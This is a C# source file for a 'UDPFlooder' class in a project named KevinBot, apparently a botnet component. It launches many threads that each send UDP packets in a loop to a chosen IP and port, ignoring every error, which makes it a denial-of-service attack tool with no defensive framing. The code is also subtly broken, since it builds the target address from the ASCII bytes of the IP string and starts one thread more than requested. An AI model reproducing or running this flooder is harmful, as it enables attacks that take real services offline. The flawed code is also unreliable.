using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Text;
using System.Threading;

namespace KevinBot.App
{
    public class UDPFlooder
    {
        IDManager IDManager = new IDManager();
        private struct Settings
        {
            public string IP;
            public int Requests;
            public int Port;
        }
        Settings S = new Settings();
        List<Thread> ThreadList;
        public void Setup(string IP, int Port, int Requests, int Threads)
        {
            ThreadList = new List<Thread>();

            S.IP = IP;
            S.Requests = Requests;
            S.Port = Port;
            for (int x = 0; x <= Threads; x++)
            {
                ThreadList.Add(new Thread(Start));
                ThreadList[x].Start();
            }
        }
        private void Start()
        {
            IPEndPoint IPEndPoit = new IPEndPoint(new IPAddress(Encoding.ASCII.GetBytes(S.IP)), S.Port);
            UdpClient UdpClient = new UdpClient();
            byte[] byteMessage = Encoding.ASCII.GetBytes(IDManager.GetRandomID(10));
            //Connect
            try
            {
                UdpClient.Connect(IPEndPoit);
            }
            catch
            { }
            int current = 0;
            while ((current <= S.Requests))
            {
                current = current + 1;

                try
                {
                    UdpClient.Send(byteMessage, byteMessage.Length);
                }
                catch
                { }
            }
        }
    }
}
